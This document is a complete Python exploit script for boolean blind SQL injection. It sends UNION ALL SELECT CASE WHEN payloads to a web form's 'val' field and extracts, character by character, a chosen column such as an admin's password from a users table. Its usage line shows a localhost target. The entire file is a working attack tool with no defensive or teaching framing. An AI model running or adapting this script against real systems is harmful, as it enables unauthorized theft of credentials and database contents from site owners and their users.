import requests
import sys
from string import printable

def sqli(address, like_statement):
    payload = "SELECT (CASE WHEN %s THEN 12345 ELSE 54321 END), 'B', 'C', 'D'" % like_statement
    r = requests.post(address, data={'val': "'UNION ALL %s;--" % payload})
    if '54321' in r.text:
        return True
    else:
        return False

def read_params():
    if len(sys.argv) in (4, 5):
        address = sys.argv[1]
        field_name = sys.argv[2]
        table_name = sys.argv[3]
        if len(sys.argv) == 5:
            where_clause ='WHERE ' + sys.argv[4]
        else:
            where_clause = ''
        return {'address': address, 'field_name':field_name, 
                'table_name':table_name, 'where_clause':where_clause}
    else:
        print('(-) Usage: python %s <address> <field_name> <table_name> [where clause]' % sys.argv[0])
        print('(*)  e.g.: python %s http://127.0.0.1:1234 password users "login=\'admin\'"' % sys.argv[0])
        exit()

def get_value_length(params):
    like_length = '(SELECT LENGTH(%s) FROM %s %s) <> %s'
    length = 0
    while True:
        like_statement = like_length % (params['field_name'], params['table_name'], 
                                           params['where_clause'], length)
        if sqli(params['address'], like_statement):
            return length
        else:
            length = length + 1

def get_value(params, length):
    like_value = "(SELECT %s FROM %s %s) NOT LIKE '%s%%'"
    value = ''
    i = 0
    while i <= length - 1:
        for char in [char for char in printable if char != '%' and char != '_']:
            value = value + char
            like_statement = like_value % (params['field_name'], params['table_name'], 
                                           params['where_clause'], value)
            if sqli(params['address'], like_statement):
                i = i + 1
                continue
            value = value[:-1]
    return value
    

def main():    
    params = read_params()
    print('(+) Recovering value form db...')
    length = get_value_length(params)
    print('\t(+) Length of the value; %s' % length)
    value = get_value(params, length)
    print('\t(+) Value: %s' % value)

if __name__=='__main__':
    main()
